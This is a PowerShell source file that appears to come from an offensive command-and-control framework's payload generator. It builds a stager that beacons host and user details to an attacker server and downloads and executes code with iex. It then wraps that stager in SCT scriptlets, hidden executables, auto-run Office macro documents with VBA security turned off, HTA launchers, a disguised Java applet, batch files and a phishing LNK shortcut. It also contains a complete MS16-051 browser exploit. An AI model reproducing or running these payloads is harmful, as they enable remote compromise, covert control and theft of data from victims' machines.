 # create base payload
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    function Get-Webclient ($Cookie) {
    $d = (Get-Date -Format "dd/MM/yyyy");
    $d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
    $k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
    if ($k -lt $d) {exit} 
    $wc = New-Object System.Net.WebClient; 
    $wc.UseDefaultCredentials = $true; 
    $wc.Proxy.Credentials = $wc.Credentials;
    $h="'+$domainfrontheader+'"
    if ($h) {$wc.Headers.Add("Host",$h)}
    $wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
    if ($cookie) {
    $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
    } $wc }
    function primer {
    if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
    $pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
    $p64 = [Convert]::ToBase64String($pre)
    $pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
    $pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
    $pm } 
    $pm = primer
    if ($pm) {$pm| iex} else {
    start-sleep 10
    primer | iex }'

    #GenPayload
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""


#Regsrv32 SCT file
function rg_sct
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $payloadparams = $payload -replace "powershell.exe ",""
    $snippet = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    >   
    <script language="VBScript">
        <![CDATA[
            Sub Exec()
            Dim objShell
            set objShell = CreateObject("shell.application")
            objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
            End Sub
            Exec()
        ]]>
    </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
<script language="VBScript">
    <![CDATA[
        Sub Exec()
        Dim objShell
        set objShell = CreateObject("shell.application")
        objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
        End Sub
        Exec()
    ]]>
</script>

</scriptlet>'

    $RGSCTFile = "$global:newdir\payloads\rg_sct.xml"
    Out-File -InputObject $snippet -Encoding ascii -FilePath $RGSCTFile
    Write-Host -Object "RG_SCT Payload written to: $global:newdir\payloads\rg_sct.xml"  -ForegroundColor Green
}

#Regsrv32 SCT file
function cs_sct
{
    
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $payloadparams = $payload -replace "powershell.exe ",""
    $snippet2 = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
	>


<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");	
]]>
</script>
</registration>

</scriptlet>'

    $CSSCTFile = "$global:newdir\payloads\cs_sct.xml"
    Out-File -InputObject $snippet2 -Encoding ascii -FilePath $CSSCTFile
    Write-Host -Object "CS_SCT Payload written to: $global:newdir\payloads\cs_sct.xml"  -ForegroundColor Green
}


# create exe 
function CreateStandAloneExe 
{

$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$csccode = 'using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;
        public Program() {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}
    
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Program.Main();       
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        Pipeline pipeline = newrunspace.CreatePipeline();

        pipeline.Commands.AddScript(cmd);
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}
Write-Host -Object "StandAlone Exe written to: $global:newdir\payloads\Posh.exe"  -ForegroundColor Green
}

#Posh.js
function poshjs
{
$t = IEX "$PoshPath\DotNetToJS\DotNetToJScript.exe -c Program -o `"$global:newdir\payloads\posh.js`" `"$global:newdir\payloads\posh.exe`"" | Out-Null
Write-Host -Object "DotNetToJS Created .js Payload written to: $global:newdir\payloads\posh.js"  -ForegroundColor Green
}


# create service exe 
function CreateServiceExe 
{
$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$cscservicecode = 'using System;
using System.Text;
using System.ServiceProcess;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace Service
{
    static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Service1()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
    public partial class Service1 : ServiceBase
    {
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch (ArgumentException e)
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
        }

        protected override void OnStop()
        {
        }
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh-service.cs", $cscservicecode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}
Write-Host -Object "Service Exe written to: $global:newdir\payloads\posh-service.exe"  -ForegroundColor Green
}

# create macro payloads
function CreateMacroPayload 
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = [Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $payloadbits = $null
    While ($payload)
    { 
        $y = $payload[0..500] -join ''
        $payload = $payload -replace $y,''
        $payloadbits = $payloadbits +'str = str + "'+$y+'"'+"`r`n"
    }

    $macro = 'Sub Auto_Open()
UpdateMacro
End Sub

Sub AutoOpen()
UpdateMacro
End Sub

Sub Workbook_Open()
UpdateMacro
End Sub

Sub WorkbookOpen()
UpdateMacro
End Sub

Sub Document_Open()
UpdateMacro
End Sub

Sub DocumentOpen()
UpdateMacro
End Sub

Sub UpdateMacro()
Dim str, exec, wsh

str = ""
'+$payloadbits+'
exec = "p"
exec = exec + "o"
exec = exec + "w"
exec = exec + "e"
exec = exec + "r"
exec = exec + "s"
exec = exec + "h"
exec = exec + "e"
exec = exec + "l"
exec = exec + "l"
exec = exec + "."
exec = exec + "e"
exec = exec + "x"
exec = exec + "e"
exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
'

$macrodoc = $macro + '
Shell(exec)
End Sub'

$wscript = $macro + '
Set wsh = CreateObject( "WScript.Shell" )
wsh.Exec(exec)
End Sub

UpdateMacro'

    [IO.File]::WriteAllLines("$global:newdir\payloads\macro.txt", $macrodoc)
    [IO.File]::WriteAllLines("$global:newdir\payloads\wscript.vbs", $wscript)
    try {
    Write-Host -Object "Macro Payload written to: $global:newdir\payloads\macro.txt"  -ForegroundColor Green
    Write-Host -Object "Wscript Payload written to: $global:newdir\payloads\wscript.vbs"  -ForegroundColor Green
    Write-Host -Object "Exe Payload written to: $global:newdir\payloads\posh.exe"  -ForegroundColor Green
    Write-Host -Object "Service-Exe Payload written to: $global:newdir\payloads\posh-service.exe"  -ForegroundColor Green

    Add-Type -AssemblyName Microsoft.Office.Interop.Excel
    $ExcelApp = New-Object -ComObject "Excel.Application"
    $ExcelVersion = $ExcelApp.Version

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $ExcelApp.DisplayAlerts = $false
    $ExcelApp.DisplayAlerts = "wdAlertsNone"
    $ExcelApp.Visible = $false
    $ExcelWorkbook = $ExcelApp.Workbooks.Add(1)
    $ExcelWorksheet = $ExcelWorkbook.Worksheets.Item(1)
    $ExcelVBA = $ExcelWorkbook.VBProject.VBComponents.Add(1)
    $ExcelVBA.CodeModule.AddFromString($macrodoc)
    $ExcelWorkbook.SaveAs("$global:newdir\payloads\ExcelMacro", [Microsoft.Office.Interop.Excel.XLFileFormat]::xlExcel8)
    Write-Host -Object "Weaponised Microsoft Excel Document written to: $global:newdir\payloads\ExcelMacro.xls"  -ForegroundColor Green
    $ExcelApp.Workbooks.Close()
    $ExcelApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Word
    $WordApp = New-Object -ComObject "Word.Application"
    $WordVersion = $WordApp.Version
    
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
    
    $WordApp.Visible = $false
    $WordPage = $WordApp.Documents.Add()
    $WordVBA = $WordPage.VBProject.VBComponents.Add(1)
    $WordVBA.CodeModule.AddFromString($macrodoc)
    $WordPage.SaveAs([ref]"$global:newdir\payloads\WordMacro", [ref][Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
    Write-Host -Object "Weaponised Microsoft Word Document written to: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
    $WordApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Powerpoint
    $PPTApp = New-Object -ComObject "Powerpoint.Application"
    $PPTVersion = $PPTApp.Version
    $notvisible = [microsoft.office.core.msotristate]::msoFalse

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $SlideType = "Microsoft.Office.Interop.Powerpoint.ppSlideLayout" -as [type]
    $BlankLayout = $SlideType::ppLayoutTitleOnly

    $PPTPage = $PPTApp.Presentations.Add([microsoft.office.core.msotristate]::msoFalse)
    $PPTVBA = $PPTPage.VBProject.VBComponents.Add(1)
    $PPTVBA.CodeModule.AddFromString($macrodoc)
    $PPTPage.SaveAs("$global:newdir\payloads\PowerpointMacro", [Microsoft.Office.Interop.Powerpoint.PpSaveAsFileType]::ppSaveAsPresentation)
    Write-Host -Object "Weaponised Microsoft Powerpoint Document written to: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
    $PPTPage.Close()
    $PPTApp.Quit()
    Stop-Process -name "POWERPNT"

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings | Out-Null
    }
    catch{
    
    }
}

# create HTA payload
function CreateHTAPayload
{
    
    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = '-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    
    #HTA index file generation
    # output simple html for loading HTA. This could be used with any cloned web page.
    # host this HTML and Launcher.HTA on a web server.
    # HTA Payload taken from https://github.com/trustedsec/unicorn , minus the obfuscation
    $HTMLCode = '<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>'
    $HTMLFile = "$global:newdir\payloads\index.html"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile

    #HTA Payload file generation
    $HTMLCode = @"
    <script>
    ao=new ActiveXObject("WScript.Shell");
    ao.run('%windir%\\System32\\' + "cmd.exe" + ' /c powershell $payloadraw', 0);window.close();
    </script>
"@
    $HTMLFile = "$global:newdir\payloads\Launcher.hta"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile
    Write-Host -Object "HTA Payload written to: $global:newdir\index.html and Launcher.hta"  -ForegroundColor Green
}

# create MS16-051 payload
function Create-MS16-051-Payload
{
    
    $poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $htmlpayload = $poshexec+'"'+','+$payload

  $html = @"
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub

            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Class Dummy
        End Class

        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper

            For i = 0 To 32
                Set plunge(i) = s
            Next

            Set aw.A(arg1, 2) = s

            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next

            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If

            getAddr = addr
        End Function

        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            Dim o
            o = aw.A(arg1, 2)

            leakMem = o
        End Function

        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute cmd
            Set Object = CreateObject("Shell.Application")
            Object.ShellExecute "$htmlpayload"
        End Function

        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
"@

  [IO.File]::WriteAllLines("$global:newdir\payloads\ms16-051.html", $html)
  Write-Host -Object "MS16-051 payload, use this via a web server: $global:newdir\payloads\ms16-051.html"  -ForegroundColor Green
}

# tests for java JDK so we can create a Jar payload and applet
function CreateJavaPayload
{
if (Test-Path "C:\program files\java\") {
    foreach ($folder in (get-childitem -name -path "C:\program files\java\"))
    {
        if ($folder.ToString().ToLower().StartsWith("jdk"))
        {
            $JDKPath = "C:\program files\java\$folder"
            CreateJavaPayloadTrue
        }
    }
} else {
    Write-host "Cannot find any Java JDK versions Installed, Install Java JDK to create Java Applet Payloads" -ForegroundColor Red
}
}


# taken from nishang Out-Java
function CreateJavaPayloadTrue
{

$OutputPath="$pwd"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$payloadraw = [Convert]::ToBase64String($bytes)

# Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
$JavaClass = @"
import java.applet.*;
import java.awt.*;
import java.io.*;
public class JavaPS extends Applet {
public void init() {
Process f;
//https://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
String arch = System.getenv("PROCESSOR_ARCHITECTURE");
String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
String cmd = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
//Remove the below if condition to use 64 bit powershell on 64 bit machines.
if (realArch == "64")
{
    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -WindowStyle Hidden -Noninteractive -nologo -noprofile -e $payloadraw";
}
try {
f = Runtime.getRuntime().exec(cmd);
}
catch(IOException e) {
e.printStackTrace();
}
Process s;
}
}
"@

# compile the Java file
$JavaFile = "$OutputPath\JavaPS.java"
Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile

$JavacPath = "$JDKPath" + "\bin\javac.exe"
& "$JavacPath" "$JavaFile"

# create a manifest for JAR, taken from SET
$Manifest = @"
Permissions: all-permissions
Codebase: *
Application-Name: Microsoft Internet Explorer Update (SECURE)
"@

$ManifestFile = "$OutputPath\manifest.txt"
Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile

# create the JAR
$Jarpath = "$JDKPath" + "\bin\jar.exe"
& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
   
# output simple html. This could be used with any cloned web page.
# host this HTML and SignedJarPS.jar on a web server.
$HTMLCode = @'
<div> 
<object type="text/html" data="https://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
</object></div>
<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar" > </applet>'
'@
$HTMLFile = "$global:newdir\payloads\applet.html"
Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   

# cleanup
Remove-Item "$OutputPath\JavaPS*"
  
# cleanup to remove temporary files
Remove-Item "$OutputPath\manifest.txt"
Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and applet.html"  -ForegroundColor Green
}

# create bat payloads
function CreatePayload 
{
    
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    [IO.File]::WriteAllLines("$global:newdir\payloads\payload.bat", $payload)

    Write-Host -Object "Batch Payload written to: $global:newdir\payloads\payload.bat"  -ForegroundColor Green
}

# create link
function CreateLink
{
    
    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
    $DestinationPath = "$global:newdir\payloads\PhishingAttack-Link.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()

    Write-Host -Object "LNK Payload written to: $DestinationPath" -ForegroundColor Green
}
